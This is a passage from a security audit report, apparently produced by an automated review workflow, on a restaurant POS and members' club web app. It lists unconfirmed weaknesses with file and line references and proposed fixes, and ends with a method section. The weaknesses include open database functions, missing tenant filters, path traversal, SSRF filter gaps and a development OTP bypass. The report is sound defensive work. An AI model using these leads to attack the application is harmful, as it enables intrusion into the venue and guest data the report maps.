- components/club/chat/useRoomRealtime.ts:21 subscribes to a public (non-private) Supabase broadcast channel club-room:<roomId>, so anyone with the anon key and a room id can observe typing aliases or spoof typing/refetch events; use private channels with Realtime authorization.
- components/club/nav/sign-out.ts:6-10 does not clear vc_club_near (last located destination, useNearPlace.ts:7) or vc_club_campaign, so the next account on a shared browser inherits the previous member's approximate location for up to 12 hours.
- components/club/pay.ts:7-16 injects the third-party Razorpay checkout script with no Content-Security-Policy in place (next.config.mjs:16-29), so any future HTML-injection bug in Club pages would have no script-src backstop.
- components/club/room/CommonRoom.tsx:49 interpolates the ?post= query value into clubFetch(`/posts/${linked}`) without encodeURIComponent, allowing client-side path traversal to other same-origin GET /api/club/* endpoints (result only rendered to the victim; GET handlers such as rooms/[id]/messages mark-read are the only side effects); encode the id or validate it as a UUID.
- components/host/control-center/SignOutButton.tsx:10 host sign-out clears only pos_tables_cache_/pos_catalog_cache_ prefixes in localStorage; guest-side keys written while the owner previews /menu on the same browser remain.
- components/host/wallet/InvoiceDetailModal.tsx:12 and components/host/wallet/slips/print-slip.ts:5 use local esc helpers (no backtick escaping, throw on non-strings) instead of lib/utils/escape-html.ts; consolidate on the shared escapeHtml for all document.write print windows.
- components/host/workspaces/accommodations/hooks/useAccommodationsData.ts:56 and components/host/workspaces/inventory/useInventory.ts:46 subscribe to postgres_changes without a business_id filter and rely only on RLS for realtime delivery (realtime RLS is peer h12 scope).
- components/host/workspaces/billing/hooks/usePOSTables.ts:131 and usePOSCatalog.ts:133 persist venue tables/menu in localStorage; they are cleared only by explicit sign-out (SignOutButton.tsx:13-17), not on session expiry; consider sessionStorage or clearing on auth state change.
- components/host/workspaces/dashboard/reports/report-csv.ts:6 does not quote fields containing a bare \r, so a CR in a name can split rows in some spreadsheet parsers (fixed by the same csvCell reuse).
- components/host/workspaces/guests/EventLeadsTab.tsx:15 builds mailto:${lead.email} without encoding and cleanEmail (lib/services/live-events/guest-key.ts:16) accepts ?, & and =, so a guest can prefill extra cc/bcc/body parameters in the owner's draft; encodeURIComponent the address or tighten the email regex.
- components/pos/PosTerminalHeader.tsx:29 staff sign-out only deletes the PIN cookie and leaves venue caches (pos_tables_cache_<venue> with live session totals, sessionStorage wallet cache) for the next same-venue user of the browser.
- create_reservation_atomic has no REVOKE FROM PUBLIC/anon, so anon can call it directly and skip the reserve API's validation and rate limits (supabase/migrations/20261016000011_reservations_and_hours.sql:137).
- deduct_inventory_stock accepts negative or zero p_qty_to_deduct and has no SET search_path (supabase/migrations/20260921210000_recipes_and_analytics.sql:24-65); it stays under RLS as SECURITY INVOKER.
- deduct_inventory_stock can log a CONSUMPTION row under the caller's business referencing another tenant's raw_item_id, because the FK check bypasses RLS (supabase/migrations/20260921210000_recipes_and_analytics.sql:47-63).
- deduct_recipe_inventory_for_order treats auth.uid() IS NULL as service-role, which also admits anon whenever it is reachable; check auth.role() = 'service_role' instead (supabase/migrations/20261010000007_inventory_movement_engine.sql:149).
- executeOrderMutation returns an in-memory order as if saved when the insert hits RLS (lib/services/orders/order-mutation.service.ts:37-41).
- findActiveRoomStayOrder looks up the room-stay folio by room_id without business_id; on the staff (adminDb) path a known foreign room UUID would copy that venue's guest name/phone into the new order (lib/services/orders/room-stay-order.util.ts:10-17).
- generateIdempotencyKey uses only the client idempotency_key when one is present, not the venue or table, so its in-memory replay cache is global across venues (lib/services/api-idempotency.util.ts:26).
- getGuestSession returns guest_sessions select('*') for any client-supplied session_id, with no venue check (lib/services/guest-session/get-session.service.ts:14).
- getOrProvisionVenueWallet falls back to a per-instance in-memory wallet showing a ₹150 balance on any DB failure (lib/services/wallet/wallet-provision.service.ts:62-78).
- lib/auth/guards.ts:249 requireHost returns err.message from unexpected exceptions to the client.
- lib/auth/staff-access.ts:18 the 10s revalidation cache is cleared wholesale at 500 entries and is per-instance, so revocation latency differs per instance.
- lib/club/chat/messages.service.ts:14, lib/club/stories.service.ts:26, lib/club/events/event-input.ts:61, lib/club/marketplace/property-input.ts:40: media path prefix checks do not reject '..' segments as meetup-input.ts:15 does.
- lib/club/events/events.service.ts:34 and lib/club/marketplace/properties.service.ts:43: edit updates are not conditioned on the status read earlier (TOCTOU with staff review).
- lib/club/events/participation.service.ts:31-36: capacity check and insert are not atomic, allowing overbooking under concurrency.
- lib/club/http.ts:62-65: readBody parses JSON regardless of Content-Type, so CSRF protection of cookie-auth Club POSTs rests solely on SameSite=Lax cookies.
- lib/club/moderation/actions.service.ts:21-32: a club_admin can mute, shadow-ban or revoke a super_admin or other staff member.
- lib/club/otp/otp.service.ts:24-31: any signed-in Supabase user can trigger 5 SMS per hour to arbitrary numbers (SMS pumping cost).
- lib/club/otp/otp.service.ts:68-73: OTP attempt counter is read-compare-update, so parallel guesses can exceed MAX_TRIES (bounded by the per-user route limiter, which is per-instance without Redis).
- lib/club/payments/payouts.service.ts:23-40: a payout may target any verified property, not one bound to the plan's agreements, and with payout_requires_approval=false the creator's own request auto-allocates escrow to that payable.
- lib/club/payments/webhook.service.ts:24-25 with capture.service.ts:18: a payment.failed for one attempt marks the order failed, so a later successful attempt on the same Razorpay order is refused and not credited.
- lib/club/qc-bridge.ts:14 dining branch queries status 'active' which QC never writes, so the handle-based stay check is dead code; if revived it must bind to a signed-in Vibers identity rather than a session's guest_handle.
- lib/club/qc-bridge.ts:27-31 checkedInUserIds reads dine_in_sessions and room_stay_logs from every QC venue (not just verified partners) and any vibers_accounts status, so any self-provisioned QC host can add a phone-matched Club account to event announcements.
- lib/club/qc-bridge.ts:5-6 matches stays on the last 10 digits only, so a verified non-Indian number sharing the last 10 digits with a checked-in guest would collide; compare full E.164.
- lib/club/secrets.ts:5-10: OTP and NOC signing key falls back to an HMAC of SUPABASE_SERVICE_ROLE_KEY when CLUB_SIGNING_SECRET is unset.
- lib/guest/guest-account-client.ts:278-290 clearGuestIdentity leaves quad_guest_cart, quad_guest_session_v2 and the per-venue delivery address/phone (components/guest/delivery/delivery-client.ts:80) in localStorage after guest sign-out on a shared phone.
- lib/middleware/error-handler.ts:26-29 reflects any client x-correlation-id into the response header, JSON body and logs with no length or charset limit.
- lib/middleware/error-handler.ts:70 returns the raw error.code (for example a SQLSTATE) to the client on 500 responses even though the message is hidden.
- lib/middleware/rate-limiter.ts:141-145 falls back silently to a per-instance memory store when Upstash is missing or errors, unless RATE_LIMIT_REQUIRE_REDIS=1; on serverless that makes the 5-per-15-min PIN limit per instance, and scripts/verify-env.mjs:62-64 only warns about it in production.
- lib/middleware/rate-limiter.ts:20 memory store keys include the client-chosen IP and are retained for 15 minutes regardless of window, so key churn grows per-instance memory under sustained traffic.
- lib/services/api-idempotency.util.ts:26 builds the key from scope plus the raw client idempotency_key without the tenant identifier, so a colliding key from another venue would receive that venue's cached response; include the identifier.
- lib/services/catalog-delete-addon.service.ts:12-13 and 37-39 select room_categories by client-supplied room_category_id with no business_id filter and update by id only; RLS blocks the foreign update but the route still reports success, so add .eq('business_id', businessId) to both.
- lib/services/catalog-delete.service.ts:73-76 and lib/services/catalog/delete-item.service.ts:19-20 delete recipe_ingredients/inventory_stock by catalog_item_id only (catalog-delete.service before any ownership check); tenant safety rests solely on RLS of the caller client, so add .eq('business_id', businessId) and verify ownership first.
- lib/services/catalog-delete.service.ts:73-76 deletes recipe_ingredients and inventory_stock by catalog_item_id without a business filter or prior ownership check; tenant safety relies solely on RLS of the owner client, so add an owned-item lookup first.
- lib/services/catalog/delete-item.service.ts:19-20 deletes recipe_ingredients/inventory_stock by catalog_item_id unscoped and accepts ownership via a room_categories row, relying on RLS for isolation.
- lib/services/catalog/resolve-business.util.ts:6-58 accepts a query-supplied business id when no explicit id is passed; every current caller passes the guard id, but the helper should not trust query parameters.
- lib/services/catalog/safe-fetch.ts:22 isPublicAddress does not reject IPv6 forms embedding IPv4 (::a.b.c.d compatible, 64:ff9b::/96 NAT64, 2002::/16 6to4), multicast ff00::/8, or v4 198.18.0.0/15 and 192.0.0.0/24.
- lib/services/catalog/safe-fetch.ts:33 validates resolved addresses, then fetch() re-resolves the hostname at :51, leaving a DNS-rebinding window; pin the validated IP (custom lookup/agent) for the connection.
- lib/services/catalog/safe-fetch.ts:42 reads the whole body with arrayBuffer() before enforcing the 6 MB cap when Content-Length is absent; stream with a running byte limit.
- lib/services/catalog/vault-ingest.ts:31 trusts the client-declared mimeType and never sniffs the decoded bytes before storing them in the public venue-vault bucket; reuse detectPhotoType.
- lib/services/guest-auth/guest-avatar.service.ts:89 uploads avatars to a public bucket with cacheControl 86400, so a deleted guest photo can stay served from CDN caches for up to a day.
- lib/services/guest-auth/wallet-ownership.ts:50 performs a claim write (rebind) on read-only GET endpoints; consider moving re-binding to sign-in only.
- lib/services/guest-menu/venue-menu-cache.ts:68 serves a stale menu copy for up to 5 minutes on DB failure, and catalog deletes do not call invalidateVenueMenu.
- lib/services/kitchen/update-ticket.service.ts:40 (currently unused) calls update_kot_status on a caller-supplied UUID with no business check; delete it or scope it.
- lib/services/offers/offer-requests-host.ts:48 bell clearing matches any PENDING OFFER_REDEEM alert containing the 6-char code, and codes are not unique, so settling one request can clear another request's alert.
- lib/services/orders/create-order.service.ts:12,55 lets a cashier overwrite any existing order of their own venue by id, including already-SETTLED bills (status, totals, items), with no state guard or audit trail. Restrict edits of closed orders to the owner.
- lib/services/orders/resolve-table-id.util.ts:28 interpolates the client table label into a PostgREST .or() filter. It stays ANDed with business_id, but the value should be escaped or matched with .in().
- lib/services/orders/resolve-table-id.util.ts:9-14 accepts any UUID tableId without checking it belongs to businessId, so orders can carry another venue's table_id. Verify the id against restaurant_tables with the business filter.
- lib/services/orders/room-stay-order.util.ts:10-19 looks up the active room_stay folio by room_id with no business_id filter. Under a cashier's adminDb client, a foreign room UUID would copy another venue's folio id and guest name/phone onto the new order. Add .eq('business_id', businessId).
- lib/services/reservations/reservations.service.ts:110 allows any-to-any status (e.g. cancelled back to confirmed) without re-checking slot availability, which can double-book a table.
- lib/services/session/detailed-session.service.ts:22 interpolates body table_id into a PostgREST .or() filter unsanitized; it stays ANDed with business_id so it cannot cross venues.
- lib/services/session/release-table.service.ts:28-36 reads kot_status and then cancels orders in separate statements, so an item started or an add-on placed in between is cancelled or orphaned; do the check and cancel in one RPC.
- lib/services/staff-auth/staff-session.ts:39 derives the staff cookie HMAC key from SUPABASE_SERVICE_ROLE_KEY when STAFF_SESSION_SECRET is unset, which couples the two secrets' rotation; verify-env does not require STAFF_SESSION_SECRET.
- lib/services/staff-auth/staff-session.ts:39 staff HMAC secret falls back to SUPABASE_SERVICE_ROLE_KEY; prefer a mandatory dedicated STAFF_SESSION_SECRET so rotating one does not affect the other.
- lib/services/table/table-crud.service.ts:86 applies the business filter on table deactivation only when businessId is truthy; always truthy today via requireHost.
- lib/services/table/update-table.service.ts:58 updates restaurant_tables by targetId with no business_id filter (lookup in resolve-table.util.ts:13 is also unscoped); safe only because the owner-only route uses the RLS user client.
- lib/services/wallet/wallet-provision.service.ts:62-78 returns a fabricated active wallet with balance 150 on any DB failure, which the profile view displays as real.
- lib/services/wallet/wallet-provision.service.ts:73 seeds a fake 150 INR venue wallet balance in per-instance memory when the DB read fails, which feeds fee-guard decisions.
- lib/utils/csv.ts:13 does not neutralise formula text after leading whitespace, or the '|' and '%' prefixes some spreadsheet apps interpret.
- lib/utils/upi.ts:49 places upiId into the upi:// URI without encoding (pa=${sanitizedUpi}); encode it or validate against a strict VPA pattern so a malformed VPA cannot append am/pa parameters.
- lib/utils/upi.ts:50 interpolates upiId into the upi:// URI without encoding, so a host-set upi_id containing & can append parameters such as am=; validate VPA format.
- lib/utils/wallet-secret.ts:18 and lib/utils/uuid.ts:10 fall back to Math.random when Web Crypto is unavailable.
- lib/utils/wallet-secret.ts:18 falls back to Math.random for the wallet secret when Web Crypto is unavailable.
- lib/utils/wallet-secret.ts:24-27 the guest wallet bearer secret lives in localStorage indefinitely for guests who never sign out, so it is readable by any future same-origin script.
- lib/vibey/core/flags.ts:28 budget uses checkRateLimit, which falls back to per-instance memory without Upstash, so the daily budget multiplies by the number of serverless instances.
- lib/vibey/core/flags.ts:28 model budget is keyed per venue only, so anonymous guests (30/min per IP, 20/min per attacker-chosen table string at app/api/guest/vibey/route.ts:52-54) can burn a venue's daily model budget and the shared provider rate limit; the effect is rules-only mode for every venue. Consider a global daily cap and a per-guest budget.
- loadEngagement reads every like and reply row for a page of posts with no limit (lib/services/lobby/lobby-engagement.ts:25-28).
- lobby_messages is readable by anon across all venues, including session_id; the lobby itself is peer-owned by h15 (supabase/migrations/20261008000003_lobby_venue_scoping.sql:110).
- markBillSettled clears only the guest uuid (components/guest/menu/hooks/useGuestOrderActions.ts:46); the quad_known_order_* key stays on the device until logout, letting a later user of the same phone open the settled bill within the server's 48h window.
- menu/info, venue-status, slots and reserve/tables GETs have no rate limit (app/api/guest/menu/info/route.ts:14; app/api/guest/venue-status/route.ts:10; app/api/guest/slots/route.ts:10; app/api/guest/reserve/tables/route.ts:10).
- next.config.mjs:16-29 sends no Content-Security-Policy.
- next.config.mjs:16-29 ships no Content-Security-Policy; with no XSS sink found this is defense-in-depth only, but a CSP would contain any future bug that could steal the localStorage wallet secret.
- next.config.mjs:27 Permissions-Policy payment=() may interfere with the Razorpay checkout iframe; not a security issue but worth verifying the policy matches the Club payment flow.
- package.json:9 runs the dev server with -H 0.0.0.0, which exposes NODE_ENV=development behaviour (error-handler debugMessage, Club OTP 123456 bypass in lib/club/otp/otp.service.ts:54) to the local network.
- resolveBusinessId's slug/name path runs an uncached select('*') over 100 businesses before any guest rate limit is applied (lib/services/guest-order/business-resolver.service.ts:140).
- resolveTableTarget accepts any UUID tableId without checking it belongs to the venue (lib/services/orders/resolve-table-id.util.ts:9-14).
- scripts/staging-phase2-e2e.mjs:25-26 hardcodes a test host email and password that sign in to the project named in .env.local; the account should be rotated or the value moved to env.
- supabase/migrations/20260930000001_venue_photo_vault.sql:43-83, 20260930000008_venue_live_offers.sql:40-78 and 20260930000005_accommodations_host_security_rls.sql:6-69 still define IF-NOT-EXISTS anon write policies USING(true); a re-run after 20261005000002_rls_lockdown.sql would recreate them, so delete or rewrite these files.
- supabase/migrations/20261009000003_cashback_on_full_bill.sql:109 re-applies billing fields and grand_total (line 276-279) to an order that is already settled; refuse settlement of closed orders.
- supabase/migrations/20261016000012_guest_delivery.sql:131 counts order_items for p_order_id without the business filter, which gives a cross-venue row-count oracle to anyone who can call the RPC.
- tests/rls_tests.sql covers no SECURITY DEFINER RPC grants or in-function authorization, so the regressions above are untested (supabase/tests/rls_tests.sql:1-56).
- update-status accepts any status string (e.g. SETTLED) with no fee or settlement path (app/api/host/orders/update-status/route.ts:18-49).
- updateVenuePlan sets status 'active', which would clear an out-of-band 'suspended' status without payment (lib/services/wallet/venue-plan.service.ts:33).
- vercel.json:3 build:release runs vitest with the full deployment environment; vitest.config.ts:17-24 overrides only Supabase and Upstash vars, so LLM_API_KEY and STAFF_SESSION_SECRET stay visible to test code.
- verifyRedemptionCode reports redeemed/cancelled status before the venue check, so it reveals whether a code exists across venues (lib/services/wallet/redemption.service.ts:162-178).
- verify_staff_pin is anon-executable through the blanket grant. It cannot verify the 'scrypt:' pin_hash format, so drop it or revoke it (supabase/migrations/20261005000003_p0_hardening_idempotency_gst_pins.sql:52).
- wallet-secret fallback uses Math.random when Web Crypto is unavailable (lib/utils/wallet-secret.ts:18).

## 8. Method, deviations and limits

- **Workflow:** six phases: recon, two hunter waves with critics, Phase 3 independent verification, findings.json validation, Phase 5 fresh record verification, then reports. Run artifacts are in `C:\Users\SANDEEP BAWA\security-audit-skill\quadcomputing\run-1`.
- **No sandbox:** no target code ran and nothing was promoted as evidence. That is why nothing is confirmed. Running the bounded local plans in a sandbox (for example a Linux VM or WSL2 with a local Supabase) would turn these leads into confirmed or rejected findings.
- **Deviations:** Hunter prompts reference a parent-written brief file (agents/_brief/) holding the verbatim architecture.md, attack-class blocks, method, promotion procedure and schema branches, instead of inlining them, to keep prompts within size limits. Content is verbatim; only the delivery differs. User-requested AUDIT_FULL_REPORT.md (file inventory pass/fail, RLS matrix, readiness verdict) is written in addition to the skill's REPORT.md set.
- **Coverage claim:** complete for this run, as recorded by the final-clean critic. That does not mean the codebase is exhausted, and the live database grants were not observed.
